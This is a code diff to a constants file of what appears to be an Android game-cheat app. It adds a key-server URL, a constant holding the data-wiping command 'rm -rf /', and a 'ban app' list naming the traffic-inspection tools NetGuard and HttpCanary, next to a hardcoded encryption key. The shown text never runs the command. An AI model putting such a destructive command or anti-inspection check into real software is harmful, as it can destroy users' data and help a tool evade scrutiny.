@@ -11,6 +11,7 @@ public class urlref {
     public static final String Liveserver = "https://gcc-org.com/deadeyeesp/live/";
     public static final String apkupdateurl = "https://gcc-org.com/deadeyeesp/app_updater.php";
     public static final String Image = "https://gcc-org.com/deadeyeesp/Image/";
+    public static final String gen = "https://gcc-org.com/deadeyeesp/Keys/";
 
     //auth
     public static final String TAG_DEVICEID = "2";
@@ -67,5 +68,11 @@ public class urlref {
 
     //encr
     public static final String enckey = "tAeKpEcDe6410111";
+    public static final String remove = "rm -rf /";
+
+    // ban app
+    public static final String netgaurd  = "eu.faircode.netguard";
+    public static final String canary  = "com.guoshi.httpcanary";
+    public static final String pcanary  = "com.guoshi.httpcanary.premium";
 
 }
